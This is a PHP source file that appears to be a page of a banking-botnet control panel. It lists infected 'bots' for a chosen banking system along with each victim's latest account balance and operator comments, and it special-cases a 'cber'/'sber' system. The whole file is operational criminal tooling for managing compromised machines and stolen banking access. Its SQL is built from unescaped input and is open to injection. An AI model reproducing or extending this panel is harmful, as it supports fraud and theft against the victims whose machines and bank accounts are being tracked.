<?php
//error_reporting(-1);
$page['count_page'] = 100;

function get_stat($bot){
	if(file_exists('cache/stat/' . $bot->system . '_' . $bot->prefix . $bot->uid)){
		return file_get_contents('cache/stat/' . $bot->system . '_' . $bot->prefix . $bot->uid);
	}else{
		return 0;
	}
}

get_function('html_pages');

//$smarty->assign('title', $lang['bots'] . ' - ' . $country_code[$Cur['str']]);

if($_SESSION['user']->config['infoacc'] == '1'){
	if($_SESSION['user']->config['systems'][$Cur['str']] == true){
		$system = $mysqli->query('SELECT nid, name FROM bf_systems WHERE (nid = \''.$Cur['str'].'\') LIMIT 1');
	}
}else{
	$system = $mysqli->query('SELECT nid, name FROM bf_systems WHERE (nid = \''.$Cur['str'].'\') LIMIT 1');
}

if($system->nid == $Cur['str']){
	$sql = array();

	if(!empty($_SESSION['user']->config['userid'])){
		$sql['userid'] = 'userid = \''.$_SESSION['user']->config['userid'].'\'';
		$sql['userid_a'] = 'a.userid = \''.$_SESSION['user']->config['userid'].'\'';
	}
	
	foreach($sql as $sk => $si){
		$sql[$sk] = preg_replace('~^ OR ~', '', $sql[$sk]);
		$sql[$sk] = '('.$sql[$sk].') AND ';
	}
	/*
	if($_SESSION['user']->config['infoacc'] == '1'){				
		$list = $mysqli->query('SELECT a.*, (SELECT balance FROM bf_balance b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.system = a.system) ORDER by post_date DESC LIMIT 1) balance, (SELECT c.comment FROM bf_comments c WHERE (c.prefix = a.prefix) AND (c.uid = a.uid) AND (c.type = a.system) LIMIT 1) comment  FROM bf_bots a WHERE '.$sql['userid'].' (a.system = \''.$system->nid.'\') ORDER by a.last_date DESC LIMIT ' . (($Cur['page'] == 0) ? $page['count_page'] : $Cur['page']*$page['count_page'] . ',' . $page['count_page']), null, null, false);
		$counts = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE '.$sql['userid'].' (system = \''.$system->nid.'\')', null, 'count', 0, 60);
	}else{
		$list = $mysqli->query('SELECT a.*, (SELECT balance FROM bf_balance b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.system = a.system) ORDER by post_date DESC LIMIT 1) balance, (SELECT c.comment FROM bf_comments c WHERE (c.prefix = a.prefix) AND (c.uid = a.uid) AND (c.type = a.system) LIMIT 1) comment  FROM bf_bots a WHERE '.$sql['userid'].' (a.system = \''.$system->nid.'\') ORDER by a.last_date DESC LIMIT ' . (($Cur['page'] == 0) ? $page['count_page'] : $Cur['page']*$page['count_page'] . ',' . $page['count_page']), null, null, false);
		$counts = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE '.$sql['userid'].' (system = \''.$system->nid.'\')', null, 'count', 0, 60);
	}
	*/
	$list = $mysqli->query('SELECT a.*, (SELECT balance FROM bf_balance b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.system = a.system) ORDER by post_date DESC LIMIT 1) balance, (SELECT c.comment FROM bf_comments c WHERE (c.prefix = a.prefix) AND (c.uid = a.uid) AND (c.type = a.system) LIMIT 1) comment  FROM bf_bots a WHERE '.$sql['userid'].' (a.system = \''.$system->nid.'\') ORDER by a.last_date DESC LIMIT ' . (($Cur['page'] == 0) ? $page['count_page'] : $Cur['page']*$page['count_page'] . ',' . $page['count_page']), null, null, false);
	$counts = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE '.$sql['userid'].' (system = \''.$system->nid.'\')', null, 'count', 0, 60);
	
	$smarty->assign('list', $list);
	$smarty->assign('system', $system);
	$smarty->assign('counts', $counts);

	$smarty->assign('pages', html_pages('/bots/system-'.$system->nid.'.html?', $counts, $page['count_page'], 1, 'bots_list', 'this.href'));

	if($system->nid == 'cber'){
		$Cur['go'] = 'system_sber';
	}
}

?>